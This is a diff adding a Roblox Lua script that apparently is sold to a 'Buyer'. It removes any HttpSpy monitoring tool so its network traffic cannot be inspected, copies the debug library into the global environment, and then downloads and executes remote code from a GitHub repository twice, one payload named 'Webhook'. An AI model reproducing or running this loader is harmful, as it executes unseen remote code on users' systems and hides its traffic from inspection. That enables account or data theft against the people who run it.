@@ -1,0 +1,29 @@
+print("Hello Buyer")
+print("My Name AfxcaxiRoblox")
+spawn(function() local function destroyHttpSpy()
+        local HttpSpy = game.CoreGui:FindFirstChild("HttpSpy")
+        if HttpSpy then
+            HttpSpy:Destroy()
+            print("You Can't Get Anything In Our Script Because Our Script Have AntiSpy")
+        end
+    end
+
+    destroyHttpSpy()
+end)
+
+for Index, Value in next, debug do
+    if not getgenv()[Index] then
+        getgenv()[Index] = Value
+    end
+end
+loadstring(game:HttpGet("https://raw.githubusercontent.com/PixelPerfectPrivacy/Rewrite/main/All%20Scripts"))()
+wait(1)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/PixelPerfectPrivacy/Rewrite/main/Webhook"))()
+
+
+
+
+
+
+
+
